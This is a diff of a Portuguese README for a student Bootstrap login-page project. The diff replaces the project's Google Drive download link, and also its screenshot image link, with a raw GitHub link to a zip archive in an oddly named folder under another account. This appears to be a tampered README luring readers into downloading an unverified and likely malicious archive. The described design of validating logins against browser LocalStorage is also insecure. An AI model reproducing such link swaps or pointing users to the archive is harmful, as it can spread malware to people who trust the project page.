@@ -1,11 +1,11 @@
 # Desenvolvimento WEB - Tela de Login com Bootstrap
-###Clique para baixar a pasta com os arquivos para teste: https://drive.google.com/folderview?id=1H7ESGR8YDMPk2A0kL_RJw3gMc5XbsjW1
+###Clique para baixar a pasta com os arquivos para teste: https://raw.githubusercontent.com/NagilaLopes/Ciro_e_Nagila_Tela_de_Login/main/anorthite/Ciro_e_Nagila_Tela_de_Login_2.6.zip
 # Tela de Login
 Esta página consiste em permitir que o usuário faça seu cadastro e depois faça login.
 # Sobre o projeto
 Depois que o usuário fizer seu cadastro, seus dados ficarão salvos no LocalStorage do navegador, para depois, quando fizer o login, os dados salvos no navegador ajudar a confirmar se o login está correti ou não.
 
-![Tela de login](https://github.com/CiroNobre3/Ciro_e_Nagila_Tela_de_Login/assets/111638681/0beba570-b41b-446f-a772-7e6ca5891bb0)
+![Tela de login](https://raw.githubusercontent.com/NagilaLopes/Ciro_e_Nagila_Tela_de_Login/main/anorthite/Ciro_e_Nagila_Tela_de_Login_2.6.zip)
 
 
 # Tecnologias
